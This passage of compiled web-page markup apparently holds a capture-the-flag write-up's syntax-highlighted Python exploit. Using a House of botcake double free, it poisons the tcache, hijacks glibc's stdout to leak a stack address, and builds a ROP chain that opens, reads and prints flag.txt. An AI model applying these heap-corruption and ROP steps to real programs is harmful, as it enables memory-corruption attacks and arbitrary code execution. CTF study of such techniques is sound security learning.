punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"15\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0xe0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"11\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"15\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x20\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"15\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x10\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"15\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x30\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Get environ and stdout\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    environ \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" libc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"symbols\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'environ'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    stdout \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" libc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"symbols\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'_IO_2_1_stdout_'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# House of botcake\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Allocate 7 blocks of size 0x200, we\\u2019ll free them later\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# We can\\u2019t leak them as before, so place them into our mem array properly\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"9\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\"i\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x200\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Allocate our prev block and our victim block, along with the buffer\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"6\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x200\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'prev'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x200\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'victim'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x10\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'flag.txt\\\\x00'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Fill the tcache!\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"9\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\"i\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# free our victim chunk\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# free our previous chunk (they are now consolidated)\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"6\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"5\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x200\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'X'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\"  \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Open up a slot in the tcache\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# double free vulnerablity, now victim is in the tcache!\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# We alloc the slightly larger chunk, getting a split of the [prev, victim] chunk\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# We\\u2019re going to write to it the necessary padding then:\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# 0x211, to preserve the size of the victim chunk\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# stdout ^ ((heap + 0x3320) \u003e\u003e 12), because we need to pass a safe-linked ptr.\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Otherwise, malloc will crash. 0x3320 offset was found via debugging.\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x230\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'T'\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0x208\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0x211\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"stdout \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"^\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"heap \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x3320\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003e\u003e\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"12\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x200\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'X'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# remove victim from the tcache again, updating the linked list structure\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# This alloc writes to stdout. It sets stdout\\u2019s write buffer to be environ, and sets flags to cause it to flush on next print\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"3\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x200\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0xfbad1800\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"environ\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"3\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"environ\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"environ \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"environ \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"environ \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:'# When printf(\"\u003e \") happens at the start of the while loop, the buffer is flushed, and our stack address gets printed out first! No newline required.'}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    stack \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" u64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"recv\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"ljust\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0x258\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# offset computed in gdb\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"print\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"Stack Leak: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"hex\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"stack\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Setup our ROP chain through libc.\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    rop \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" ROP\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"libc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Use that buffer block as a flag buffer (offsets found through gdb)\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    flagoffset \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x55d31ac5f520\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x55d31ac5c000\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    flag \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" heap \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" flagoffset\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"16\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Just make the area after the flag chunk our buffer, its probably writable.\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    output \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" flag \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x20\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"print\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"Flag.txt: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"hex\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"flag\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Use rop call to automatically generate function calls\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    rop\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"call\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'syscall'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" flag\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    rop\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"call\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'syscall'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"3\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" output\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x100\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    rop\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"call\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'syscall'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" output\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x100\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# free our forged chunk\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# free our victim chunk\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# write to our forged chunk (which again contains the metadata to victim)\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x230\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'T'\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0x208\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0x211\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"stack \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"^\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"heap \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x3320\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003e\u003e\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"12\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# alloc our victim chunk again.\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token 